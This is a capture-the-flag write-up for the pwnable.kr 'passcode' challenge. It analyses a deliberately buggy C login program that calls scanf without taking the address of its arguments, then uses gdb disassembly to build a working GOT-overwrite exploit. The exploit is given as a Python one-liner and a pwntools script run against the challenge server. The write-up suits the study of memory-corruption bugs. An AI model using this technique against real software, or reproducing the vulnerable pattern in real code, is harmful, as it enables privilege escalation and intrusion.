# passcode Writeup

## Challenge infos

```text
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
$ sshpass -p guest ssh passcode@pwnable.kr -p2222
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Thu Apr 18 12:00:18 2019 from 213.195.99.69
passcode@ubuntu:~$ ls -la
total 36
drwxr-x---  5 root passcode     4096 Oct 23  2016 .
drwxr-xr-x 93 root root         4096 Oct 10  2018 ..
d---------  2 root root         4096 Jun 26  2014 .bash_history
-r--r-----  1 root passcode_pwn   48 Jun 26  2014 flag
dr-xr-xr-x  2 root root         4096 Aug 20  2014 .irssi
-r-xr-sr-x  1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--  1 root root          858 Jun 26  2014 passcode.c
drwxr-xr-x  2 root root         4096 Oct 23  2016 .pwntools-cache
passcode@ubuntu:~$ id
uid=1010(passcode) gid=1010(passcode) groups=1010(passcode)
passcode@ubuntu:~$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
passcode@ubuntu:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

passcode@ubuntu:~$
```
## Exploitation objective
* The ssh user is ```passcode```, group ```passcode```
* The ```flag``` file is readable only by the user ```root``` or the group ```passcode_pwn```
* The ```passcode``` binary is a 32bit ELF executable by any user whose group is ```passcode_pwn``` and is ```sgid``` meaning that it executes with the rights of its group even if called by a member not in the group

This means that if we pwn the ```passcode``` executable we can gain read access to the ```flag``` file via sgid group ```passcode_pwn```.

The ```passcode``` executable is certainly compiled from the ```passcode.c``` source code, let's have a look.

## C code analysis
```c
void login(){
        int passcode1;
        int passcode2;
```

* At the start of ```login```, ```passcode1``` and ```passcode2``` are uninitialized integers


```c
        scanf("%d", passcode1);
```

* There's a typo in this code, it should be ```scanf("%d", &passcode1);``` to pass the address of the ```passcode1``` variable to ```scanf``` in order to set it to the provided integer
* This will segfault if ```passcode1``` is a random value because it would try to write the provided integer to a random memory location

```c
        printf("enter passcode2 : ");
```

* Same things for ```passcode2```

```c
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
```

* If we can somehow set ```passcode1``` to ```338150``` and ```passcode2``` to ```13371337``` we can access this ```system("/bin/cat flag");``` which is our target

```c
void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}
```

* We are provided a 100 bytes buffer to write data to the stack

```c
        welcome();
        login();
```

* ```welcome``` is called before ```login``` so we can put data on the stack via the ```name``` buffer before the call to ```login``` in order to set the uninitialized variables to something we control

* The first idea would be to use it to set ```passcode1``` to ```338150``` and ```passcode2``` to ```13371337```

## Debugging

* Let's try to debug with ```gdb``` to see where we can set the ```passcode1``` and ```passcode2``` to values that are interesting to us

```text
$ gdb ./passcode
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./passcode...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break login
Breakpoint 1 at 0x804856a
(gdb) run <<< $(python -c "print 'A'*100")
Starting program: ./passcode <<< $(python -c "print 'A'*100")
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Breakpoint 1, 0x0804856a in login ()
(gdb) disassemble
Dump of assembler code for function login:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     sub    esp,0x28
=> 0x0804856a <+6>:     mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) x $ebp-0x10
0xffc551e8:     0x41414141
(gdb) x $ebp-0xc
0xffc551ec:     0xfb0e9d00
(gdb) run <<< $(python -c "print 'A'*96 + 'B'*4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: ./passcode <<< $(python -c "print 'A'*96 + 'B'*4")
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!

Breakpoint 1, 0x0804856a in login ()
(gdb) x $ebp-0x10
0xffa30ae8:     0x42424242
(gdb) x $ebp-0xc
0xffa30aec:     0x8595b900
(gdb) x 338150
0x528e6:        Cannot access memory at address 0x528e6
(gdb) x 13371337
0xcc07c9:       Cannot access memory at address 0xcc07c9
(gdb)
```

* We see from the disassembly that ```passcode1``` is at ```[ebp-0x10]``` and ```passcode2``` at ```[ebp-0xc]```
* If we fill the ```name``` buffer with 100 ```A``` (```ASCII 0x41```), we can see that we can control the initial value of ```passcode1``` but not ```passcode2```
* By filling the buffer with 96 ```A``` and 4 ```B``` we can confirm that it's the last 4 bytes of ```name``` that set the value of ```passcode1```
* Not only can't we control the value in ```passcode2``` but trying to set ```passcode1``` to its expected value would segfault at the first ```scanf```
Hum... We need to think more...

## Evaluation of possibilities
* We can't pass the first ```scanf``` if we directly set the ```passcode1``` variable to the value tested in the condition and we can't set it afterward
* On the other hand, with the first ```scanf``` we can write a value we control at a memory address we control
We could think about setting the initial value of ```passcode1``` to its address in order to set it via the ```scanf``` but we would face two problems:
* The address of ```passcode1``` is known relative to the base pointer but we can't leak the base pointer value at runtime
* If we knew it we could either set ```passcode1``` and ```passcode2``` would be random data, so the second ```scanf``` would segfault or set ```passcode2``` to its address and use the second ```scanf``` to set its value but the value of ```passcode1``` would then be the address of ```passcode2``` and have little chance of being the expected value

One other thing we could do, since we have the possibility of writing 4 bytes wherever we want is to replace a function pointer with the instruction right after the impossible passcode check. Let's check what happens after the first scanf :
```c
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

* What a conveniently placed call to ```fflush```, it is the first time during the execution that it is called, so it needs GOT resolution, we can replace its address in the GOT with the address of the instruction we need to reach

## Exploitation

* From the disassembly we can see that the interesting instruction is right before the call to ```system```, when the ```"/bin/cat flag"``` buffer is pushed on the stack, which is at ```0x080485e3```

* We can use ```gdb``` to find the ```fflush``` GOT address :
```text
(gdb) disassemble fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:     push   0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
(gdb)
```
* During the first ```fflush``` call, the PLT resolution will jump at the address at ```0x804a004```, this is our target address to write the instruction where we want to go next

* We need to set the last four bytes of ```name``` to ```0x804a004``` (Little Endian ```\x04\xa0\x04\x08```) to trick the first ```scanf``` into writing ```0x080485e3``` (decimal ```134514147```) and then the ```fflush``` call will jump into the target piece of code

* This can be accomplished with python on the command line : ```python -c "print 'A'*96 + '\x04\xa0\x04\x08' + '\n' + '134514147' + '\n'" | ./passcode```

* ```PWN```

## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```

* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation

```python
exe = ELF('./passcode')

fflush_got = exe.got.fflush

target_block = 0x080485e3
```

* Read the ```fflush``` GOT address from the ELF file and set the ```target_block``` to the one extracted from ```gdb```

```python
payload = fit({96: p32(fflush_got)})
payload += '\n'
payload += str(target_block)
```

* Set the payload to random bytes with the packed value of ```fflush_got``` at the 4 last bytes of ```name```, then after a line feed the decimal value of ```target_block```

```python
# io = process(exe.path)

server = ssh('passcode', 'pwnable.kr', 2222, 'guest')
io = server.process('./passcode')
```

* During testing the ```io``` is set to the local ```./passcode``` executable downloaded by the setup script
* After the exploit is working we can use it on the server by ssh-ing to it before setting ```io``` to the remote ```.\passcode``` executable

```python
io.sendline(payload)

result = io.recvall()

io.close()
server.close()
print(result)
```
* Send the ```payload```
* Print the ```result``` which is the ```flag```
* ```PWN```
